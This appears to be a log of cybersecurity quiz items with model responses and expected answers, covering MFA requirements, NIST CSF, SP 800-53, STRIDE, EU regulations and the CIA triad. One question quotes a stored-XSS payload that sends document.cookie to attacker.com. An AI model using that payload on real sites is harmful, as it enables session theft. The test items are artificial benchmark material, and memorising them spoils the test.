SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?

LLM RESPONSE:
**Type of statement**  
It is a **security‑control requirement** (often phrased as a policy or rule) that specifies what must happen in the system.

**Primary purpose**  
The statement mandates that every administrative account be protected by multi‑factor authentication. Its goal is to reduce the risk of unauthorized or compromised privileged access, thereby hardening the system against credential‑based attacks.

EXPECTED SHORT ANSWER:
This statement is a security requirement. Its purpose is to define a specific functionality or constraint (MFA) to protect critical access.

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
A company experiences a ransomware attack. They activate their incident response plan to contain the damage and begin restoring systems from backups. According to the NIST Cybersecurity Framework (CSF), which two core functions are most prominently demonstrated by these actions?

LLM RESPONSE:
The actions illustrate **Respond** (activating the incident‑response plan to contain the attack) and **Recover** (restoring systems from backups).

EXPECTED SHORT ANSWER:
The primary functions demonstrated are 'Respond' (activating the incident plan) and 'Recover' (restoring from backups).

Response Time: 305.35 seconds

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?

LLM RESPONSE:
The requirement is covered by the **AU (Audit and Accountability) family** in NIST SP 800‑53 (e.g., AU‑2, AU‑3, AU‑6, AU‑8, AU‑9).

EXPECTED SHORT ANSWER:
This requirement is addressed by the 'AU' (Audit and Accountability) control family.

Category: Vulnerabilities - Identification
Response Time: 227.52 seconds

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?

LLM RESPONSE:
The flaw is a classic **Cross‑Site Scripting (XSS)** vulnerability – specifically a stored XSS because the script is saved in the comment and later served to other users.  
Its formal identifier in the Common Weakness Enumeration is **CWE‑79: Cross‑Site Scripting**.

EXPECTED SHORT ANSWER:
This vulnerability is known as Cross-Site Scripting (XSS). Its corresponding identifier is CWE-79.

Model: gpt-oss:20b
Category: Threat Modeling - Classification
Response Time: 103.64 seconds

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
During a threat modeling exercise, a team identifies a risk where an unauthorized user could intercept and alter data packets being sent between a client and a server, changing the amount of a financial transaction. Within the STRIDE threat model, which category does this threat belong to?

LLM RESPONSE:
That falls under **Tampering** in the STRIDE model.

EXPECTED SHORT ANSWER:
This threat belongs to the 'Tampering' category of the STRIDE model, as it involves the unauthorized modification of data.

Category: Regulations/Directives - Application
Response Time: 170.99 seconds

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?

LLM RESPONSE:
- **Incident 1 (power‑grid cyberattack):** The EU’s **NIS Directive** (Directive 2016/1148 on the security of network and information systems) – it governs the security of essential services such as electricity supply.  

- **Incident 2 (social‑media data breach):** The **General Data Protection Regulation (GDPR)** – it regulates the processing and protection of personal data, including private messages.

EXPECTED SHORT ANSWER:
Incident 1 (disruption of critical infrastructure) is primarily a concern for the NIS 2 Directive. Incident 2 (breach of personal data) is a primary concern for GDPR.

Response Time: 90.00 seconds

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
A cloud storage service uses data checksums (like SHA-256 hashes) to verify that files have not been altered or corrupted during upload or download. Which principle of the CIA triad is primarily being upheld by this security control?

LLM RESPONSE:
The control is mainly safeguarding **Integrity**—the “I” in the CIA triad. By verifying checksums you confirm that the file’s contents have not been altered or corrupted, ensuring data integrity.

EXPECTED SHORT ANSWER:
This control primarily upholds the principle of 'Integrity'.
